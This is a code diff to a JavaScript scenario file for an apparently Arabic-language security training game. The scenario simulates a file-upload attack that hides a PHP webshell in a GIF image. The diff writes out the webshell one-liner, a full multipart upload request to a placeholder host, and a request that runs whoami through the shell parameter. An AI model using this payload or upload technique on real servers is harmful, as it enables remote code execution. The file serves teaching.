@@ -57,44 +57,6 @@ window.scenario_008 = {
       "workspace": "recon",
       "xpReward": 150,
       "description": "### 🔍 إعداد ومقارنة ملف الـ GIF المحقون\n\nسنقوم بإنشاء صورة GIF ومقارنتها بعد الرفع لمعرفة البايتات التي لم تعدلها مكتبة ImageMagick.\nاختر الأداة المناسبة لتشغيلها.",
-      "terminalCommands": [
-        {
-          "name": "convert -size 100x100 xc:black test.gif",
-          "correct": true,
-          "evidence": {
-            "title": "Clean GIF Created",
-            "content": "Image size: 100x100\nType: GIF\nUnused Bytes: Found empty byte sequence at offset 0x30"
-          },
-          "output": [
-            {
-              "text": "[INF] Creating solid black GIF image...",
-              "type": "info"
-            },
-            {
-              "text": "File test.gif created successfully.",
-              "type": "success"
-            },
-            {
-              "text": "[!] Success: Empty byte spaces identified in GIF format metadata!",
-              "type": "success"
-            }
-          ]
-        },
-        {
-          "name": "exiftool test.gif",
-          "correct": false,
-          "output": [
-            {
-              "text": "ExifTool Version Number: 12.40",
-              "type": "info"
-            },
-            {
-              "text": "File Type: GIF",
-              "type": "out"
-            }
-          ]
-        }
-      ],
       "aiAdvisor": {
         "hint": "شغّل أمر convert لإنشاء صورة GIF تجريبية وفحص البايتات الفارغة بالملف.",
         "payloadExplanation": "الأمر convert من أدوات ImageMagick يقوم بإنشاء ملف صور نقي لاختبار مساحات الحقن.",
@@ -109,18 +71,6 @@ window.scenario_008 = {
       "description": "### 🌐 رفع الـ GIF المحقون بالـ PHP Webshell\n\nقمنا بحقن كود `<?php system($_GET[\"c\"]); ?>` في المساحات الفارغة من ملف الـ GIF.\nاضغط على **Upload & Execute command** لتأكيد إمكانية تشغيل أمر whoami على خادم الويب.",
       "burpRequest": "POST /api/upload-avatar HTTP/1.1\nHost: target-social.com\nContent-Type: multipart/form-data; boundary=----Boundary\n\n------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"avatar.gif\"\nContent-Type: image/gif\n\nGIF89a...\n<?php system($_GET[\"c\"]); ?>\n------Boundary--",
       "burpResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"url\": \"https://cdn.target-social.com/avatars/user_1337.gif\"\n}",
-      "burpActions": [
-        {
-          "name": "Upload & Execute command",
-          "correct": true,
-          "modifiedRequest": "GET /avatars/user_1337.gif?c=whoami HTTP/1.1\nHost: cdn.target-social.com\nUser-Agent: Mozilla/5.0",
-          "modifiedResponse": "HTTP/1.1 200 OK\nContent-Type: text/html\n\nwww-data\n[Executed command whoami on server successfully!]",
-          "evidence": {
-            "title": "ImageMagick GIF RCE",
-            "content": "GET /avatars/user_1337.gif?c=whoami -> Returns www-data shell output"
-          }
-        }
-      ],
       "aiAdvisor": {
         "hint": "اضغط على زر Upload & Execute command لتشغيل الاستعلام وقراءة نتيجة shell.",
         "payloadExplanation": "طلب الصورة مع تمرير المعامل c لتشغيل أمر whoami على الخادم.",
@@ -208,6 +158,40 @@ window.scenario_008 = {
       "rce"
     ]
   },
+  simulateTerminal(command) {
+    const cmd = command.trim();
+    if (cmd.startsWith("convert ")) {
+      return {
+        output: [
+          { text: "[INF] Creating solid black GIF image...", type: "info" },
+          { text: "File test.gif created successfully.", type: "success" },
+          { text: "[!] Success: Empty byte spaces identified in GIF format metadata!", type: "success" }
+        ],
+        correct: true,
+        evidence: { title: "Clean GIF Created", content: "Image size: 100x100\nType: GIF\nUnused Bytes: Found empty byte sequence at offset 0x30" },
+        outcome: "تم إنشاء ملف GIF بنجاح! مساحات الـ Metadata الفارغة تم تحديدها، يمكنك الآن حقن الكود الخبيث بداخلها وإرساله عبر أداة Burp Suite."
+      };
+    } else if (cmd.startsWith("exiftool")) {
+      return {
+        output: [
+          { text: "ExifTool Version Number: 12.40", type: "info" },
+          { text: "File Type: GIF", type: "out" },
+          { text: "MIME Type: image/gif", type: "out" }
+        ],
+        correct: false,
+        outcome: "الأداة تؤكد أن الملف الذي قمت بإنشائه عبارة عن صورة GIF صالحة للاستخدام."
+      };
+    } else {
+      return {
+        output: [
+          { text: `Command not found or not useful: ${cmd}`, type: "error" },
+          { text: "Try using 'convert -size 100x100 xc:black test.gif' to create the base GIF file.", type: "info" }
+        ],
+        correct: false
+      };
+    }
+  },
+
   simulateBackend(requestText, bodyJson) {
     const parsed = window.HttpRequestParser.parse(requestText);
     const builder = new window.HttpResponseBuilder();
